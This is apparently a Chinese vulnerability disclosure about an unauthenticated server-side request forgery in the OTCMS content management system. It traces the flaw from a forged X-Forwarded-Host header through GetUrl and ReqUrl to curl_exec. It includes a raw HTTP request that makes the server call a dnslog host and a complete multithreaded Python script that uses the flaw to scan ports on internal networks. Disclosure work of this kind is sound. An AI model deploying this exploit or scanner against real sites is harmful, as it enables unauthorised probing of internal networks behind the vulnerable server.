# OTCMS 在/admin/readDeal.php?mudi=checkHomeHtml处存在未授权的ssrf漏洞

代码分析:
首先定位到漏洞的触发点:
/admin/readDeal.php?mudi=checkHomeHtml,传入$mudi参数触发函数CheckHomeHtml(),且无任何身份验证

```
switch ($mudi){
	case 'updateWebCache':
		UpdateWebCache();
		break;

	case 'clearWebCache':
		ClearWebCache();
		break;

	case 'updateBackupCall':
		UpdateBackupCall();
		break;

	case 'checkEditorMode':
		CheckEditorMode();
		break;

	case 'readQrCode':
		ReadQrCode();
		break;

	case 'checkHomeHtml':
		CheckHomeHtml();
		break;

	default:
		die('err');
}
```
进入CheckHomeHtml(),分析代码中两个关键参数$beforeURL和 $homeHtmlStr,
```
function CheckHomeHtml(){
	global $systemArr;
	$beforeURL	= GetUrl::CurrDir(1);
	$webHtml = new WebHtml();
	$homeHtmlStr = $webHtml->GetCode($beforeURL);
	if (strpos($homeHtmlStr,'<!-- Html For') !== false){
		JS::AlertEnd('网站首页是静态页.');
	}else{
		JS::AlertEnd('网站首页不是静态页，您静态页名是 '. $systemArr['SYS_htmlHomeName'] .'.\n1、检查前台'. $systemArr['SYS_htmlHomeName'] .'文件是否存在。\n2、首页默认页'. $systemArr['SYS_htmlHomeName'] .'要优先于index.php');
	}
}
```
首先分析$beforeURL,跟进GetUrl::CurrDir(1)
inc/classGetUrl.php
```
	public static function CurrDir($dirRank=0){
		$currUrl = self::Curr();
		for ($udi=0; $udi<=$dirRank; $udi++){
			$currUrl=substr($currUrl,0,strrpos($currUrl,'/'));
		}
		return $currUrl .'/';

	}
```
再次跟进self::Curr(),可以看到这里是要返回一个完整的url结构,接下来跟进分析这三个函数self::HttpHead(),self::HttpHost(),self::HttpSelf()
```
	// 获取当前网址，不含?和参数
	public static function Curr(){
		// $SERVER_PORT = self::Port();
		// $SER_HOST = $_SERVER['SERVER_NAME'] . $SERVER_PORT;
		$SER_HOST = self::HttpHost();
		return self::HttpHead() . $SER_HOST . self::HttpSelf();
	}
```
分析可知返回的url结构的控制是以http或https和通过HTTP_X_FORWARDED_HOST来设置host,最后获取$_SERVER['PHP_SELF']存在控制的可能性
```
public static function HttpHost(){
		// return isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
		if ( isset($_SERVER['HTTP_X_FORWARDED_HOST']) ){
			$retStr = $_SERVER['HTTP_X_FORWARDED_HOST'];
		}elseif ( isset($_SERVER['HTTP_HOST']) ){
			$retStr = $_SERVER['HTTP_HOST'];
		}else{
			$retStr = $_SERVER['SERVER_NAME'] . ($_SERVER['SERVER_PORT']=='80' ? '' : ':'. $_SERVER['SERVER_PORT']);
		}
		return $retStr;
	}

	public static function HttpSelf(){
		return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
	}

	// 获取网址协议 http:// 或 https://
	public static function HttpHead($skip=false){
		global $systemArr;
		if (empty($systemArr)){ $systemArr = Cache::PhpFile('system'); }

		if (in_array($systemArr['SYS_urlHead'],array('http','https')) && $skip==false){
			return $systemArr['SYS_urlHead'] .'://';
		}else{
			// return ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
			if ( ! empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off'){
				return 'https://';
			}elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https'){
				return 'https://';
			}elseif ( ! empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off'){
				return 'https://';
			}else{
				return 'http://';
			}
		}
	}

```
分析完$beforeURL接下来分析 $homeHtmlStr参数,跟进 $webHtml->GetCode()
inc/classWebHtml.php
这里的$judProxy默认为false,可以顺利进入if支线触发ReqUrl::UseAuto()
![](vx_images/98623266768636.png)

```
	// 获取网页源码（限制读取时间）
	// URL：网页地址；charset：编码
	function GetCode($URL, $charset='UTF-8'){
		global $DB,$systemArr;

		if (empty($URL)){
			$this->mErrStr='网址错误';
			return 'False';
		}
		
		class_exists('ReqUrl',false) or require(OT_ROOT .'inc/classReqUrl.php');

		if ($this->judProxy && strlen($systemArr['SYS_proxyIpList']) > 8){
			$proxyIp = '';
			$proxyPort = 80;
			$currArr = Area::ListPoint('proxyIp',$systemArr['SYS_proxyIpList'],'arr');
			$oneArr = explode(':', $currArr['str']);
			$proxyIp = $oneArr[0];
			if (count($oneArr) >= 2){ $proxyPort = $oneArr[1]; }
			$this->proxyIp =  '【第'. (intval($currArr['point'])+1) .'行】'. $proxyIp .':'. $proxyPort;

			$retArr = ReqUrl::ProxyCurl('GET', $URL, array('ip'=>$proxyIp,'port'=>$proxyPort), $charset);
			if ($retArr['res']){ $this->proxyErr = ''; }else{ $this->proxyErr = $retArr['note']; }
			// print_r($retArr);die('IP:'. $proxyIp .':'. $proxyPort);
		}else{
			$retArr = ReqUrl::UseAuto($this->mGetUrlMode, 'GET', $URL, $charset);
		}
		if (! $retArr['res']){ $retStr='False'; }else{ $retStr=$retArr['note']; }

		return $retStr;
	}
```
查看ReqUrl::UseAuto(),可以发现上一部传入了$this->mGetUrlMode来选择进入switch,
![](vx_images/159863411040826.png)
跟踪$getUrlMode,发现将会获取到默值0
![](vx_images/537324740923138.png)
这时将会进入switch的default,该cms默认会启用curl,所以触发self::UseCurl($method, $url, $charset, $dataArr)
inc/classReqUrl.php
```
public static function UseAuto($seMode, $method, $url, $charset='UTF-8', $dataArr=array(), $retMode=''){
		$retArr = array('res'=>false, 'note'=>'');

		switch ($seMode){
			case 1:	// Snoopy插件
				$retArr = self::UseSnoopy($method, $url, $charset, $dataArr);
				break;
		
			case 2:	// curl模式
				$retArr = self::UseCurl($method, $url, $charset, $dataArr);
				break;
		
			case 3:	// fsockopen模式
				$retArr = self::UseFsockopen($method, $url, $charset, $dataArr);
				break;

			case 4:	// fopen模式
				$retArr = self::UseFopen($method, $url, $charset, $dataArr);
				break;

			default :
				if (extension_loaded('curl')){
					$retArr = self::UseCurl($method, $url, $charset, $dataArr);
					//echo('curl['. $retArr['note'] .']<br />');
				}
				if ($retArr['res'] == false && function_exists('stream_socket_client')){
					$retArr = self::UseSnoopy($method, $url, $charset, $dataArr);
					//echo('Snoopy['. $retArr['note'] .']<br />');
				}
				if ($retArr['res'] == false && function_exists('fsockopen')){
					$retArr = self::UseFsockopen($method, $url, $charset, $dataArr);
					//echo('fsockopen['. $retArr['note'] .']<br />');
				}
				if ($retArr['res'] == false && (ini_get('allow_url_fopen') == 1 || strtolower(ini_get('allow_url_fopen')) == 'on')){
					$retArr = self::UseFopen($method, $url, $charset, $dataArr);
					//echo('fopen['. $retArr['note'] .']<br />');
				}
				break;
		}

		if ($retMode == 'res'){
			return $retArr['res'];
		}elseif ($retMode == 'note'){
			return $retArr['note'];
		}else{
			return $retArr;
		}
	}
```
跟进UseCurl()方法,分析发现最终会触发curl_exec(),会对传入的url进行请求,导致ssrf
```
	// 获取页面源代码2 curl模式
	public static function UseCurl($method, $url, $charset='UTF-8', $dataArr=array(), $run301=true){
		if (empty($url)){
			return array('res'=>false, 'note'=>'UseCurl：网址为空');
		}

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'); 
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 80);	// 响应时间
		curl_setopt($ch ,CURLOPT_TIMEOUT, 150);			// 设置超时
		// 使用的HTTP协议，CURL_HTTP_VERSION_NONE（让curl自己判断），CURL_HTTP_VERSION_1_0（HTTP/1.0），CURL_HTTP_VERSION_1_1（HTTP/1.1）
		curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
		// curl_setopt($ch, CURLOPT_MAXREDIRS,20);		// 允许跳转多少次
		// curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);	// 自动抓取301跳转后的页面
		if (substr(strtolower($url),0,8) == 'https://'){
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);	// 跳过证书检查  
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);		// 从证书中检查SSL加密算法是否存在
		}
		if (strtoupper($method) == 'POST'){
			if (is_array($dataArr)){
				$newData = http_build_query($dataArr);	// 相反函数 parse_str()
			}else{
				$newData = $dataArr;
			}
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $newData);
		}
		$data = curl_exec($ch);

		// 检查是否有错误发生
		if(curl_errno($ch)){ return array('res'=>false, 'note'=>'UseCurl：发生错误（'. curl_error($ch) .'）'); }

		// 检查HTML返回状态
		$headArr = curl_getinfo($ch);

		curl_close($ch);

		if ($run301 && in_array($headArr['http_code'],array(301,302))){
			return self::UseCurl($method, $headArr['redirect_url'], $charset, $dataArr, false);
		}
		// if($headArr['http_code'] != 200){ return array('res'=>false, 'note'=>'UseCurl：返回状态'. $headArr['http_code']); }

		if (strlen($data) == 0){ return array('res'=>false, 'note'=>'UseCurl：获取内容为空'); }

		$siteCharset = strtoupper(OT_Charset);
		if ($siteCharset=='GB2312'){ $siteCharset='GBK'; }
		if ($charset != $siteCharset){
			$data = iconv($charset,OT_Charset .'//IGNORE',$data);
		}
		return array('res'=>true, 'note'=>$data);
	}
```

这里在本地进行复现
构造请求包:
```
GET /admin/readDeal.php?mudi=checkHomeHtml HTTP/1.1
Host: otcms
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-host: 111111111.56b74aa0.log.dnslog.pp.ua
Connection: keep-alive


```
![](vx_images/462187191857647.png)
![](vx_images/558676187818432.png)

在本地模拟判断内网信息
在win11上开启python的多个web服务
python -m http.server 4455 --bind 127.0.0.1
python -m http.server 5566 --bind 127.0.0.1
python -m http.server 6677 --bind 127.0.0.1
python -m http.server 7788 --bind 127.0.0.1

使用脚本根据返回时间判断内网的http服务端口的开启情况
```
#!/usr/bin/env python3

import sys
import time
import concurrent.futures
import requests
import re


def scan_port_with_requests(target_ip, port, timeout=4):
    """使用requests扫描端口"""
    headers = {'X-Forwarded-Host': f'{target_ip}:{port}'}

    try:
        start = time.time()
        response = requests.get(
            'http://otcms/admin/readDeal.php?mudi=checkHomeHtml',
            headers=headers,
            timeout=timeout,
            verify=False
        )
        elapsed = (time.time() - start) * 1000

        if elapsed < timeout * 1000 and response.status_code < 500:
            return port, round(elapsed, 2)

    except requests.RequestException:
        pass

    return None


def parse_ports(port_arg):
    """解析端口参数，支持单端口、端口范围、端口列表"""
    ports = []
    
    # 如果是端口范围格式 (如 80-100)
    if '-' in port_arg:
        try:
            start, end = map(int, port_arg.split('-'))
            if start <= end and 1 <= start <= 65535 and 1 <= end <= 65535:
                ports = list(range(start, end + 1))
            else:
                print(f"❌ 端口范围无效: {port_arg}")
                return None
        except ValueError:
            print(f"❌ 端口范围格式错误: {port_arg}")
            return None
    
    # 如果是端口列表格式 (如 22,80,443)
    elif ',' in port_arg:
        try:
            port_list = port_arg.split(',')
            for p in port_list:
                port = int(p.strip())
                if 1 <= port <= 65535:
                    ports.append(port)
                else:
                    print(f"❌ 端口号超出范围 (1-65535): {port}")
                    return None
        except ValueError:
            print(f"❌ 端口列表格式错误: {port_arg}")
            return None
    
    # 单个端口
    else:
        try:
            port = int(port_arg)
            if 1 <= port <= 65535:
                ports = [port]
            else:
                print(f"❌ 端口号超出范围 (1-65535): {port}")
                return None
        except ValueError:
            print(f"❌ 端口格式错误: {port_arg}")
            return None
    
    return sorted(list(set(ports)))  # 去重并排序


def fast_scan(target_ip, ports=None, timeout=4, threads=50):
    """快速扫描端口列表"""
    if ports is None:
        # 默认扫描常用端口
        ports = [
            21, 22, 23, 25, 53, 80, 443, 445, 8080, 8443,
            3306, 3389, 5900, 6379, 27017, 5432
        ]
        print(f"⚡ 正在扫描 {target_ip} 的常用端口...")
    else:
        print(f"⚡ 正在扫描 {target_ip}...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []

        for port in ports:
            futures.append(
                executor.submit(scan_port_with_requests, target_ip, port, timeout)
            )

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                port, rt = result
                print(f"✅ {port}: {rt}ms")


# 命令行接口
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("使用方法:")
        print("  python ssrf.py <目标IP>                    # 扫描常用端口")
        print("  python ssrf.py <目标IP> <端口号>          # 扫描单个端口")
        print("  python ssrf.py <目标IP> <起始端口>-<结束端口>  # 扫描端口范围")
        print("  python ssrf.py <目标IP> <端口1>,<端口2>,...   # 扫描多个指定端口")
        print()
        print("示例:")
        print("  python ssrf.py 192.168.1.1              # 扫描常用端口")
        print("  python ssrf.py 192.168.1.1 80           # 扫描80端口")
        print("  python ssrf.py 192.168.1.1 80-100       # 扫描80到100端口")
        print("  python ssrf.py 192.168.1.1 22,80,443    # 扫描22,80,443端口")
        sys.exit(1)
    
    ip = sys.argv[1]
    
    # 验证IP地址格式
    ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(ip_pattern, ip):
        print(f"❌ IP地址格式无效: {ip}")
        sys.exit(1)
    
    # 解析端口参数
    if len(sys.argv) > 2:
        port_arg = sys.argv[2]
        ports = parse_ports(port_arg)
        if ports is None:
            sys.exit(1)
    else:
        ports = None  # 使用默认常用端口
    
    # 开始扫描
    fast_scan(ip, ports=ports)
```
![](vx_images/480082735964291.png)

![](vx_images/85454382283071.png)
![](vx_images/141752756105168.png)
![](vx_images/203021771462046.png)
![](vx_images/313692007356237.png)





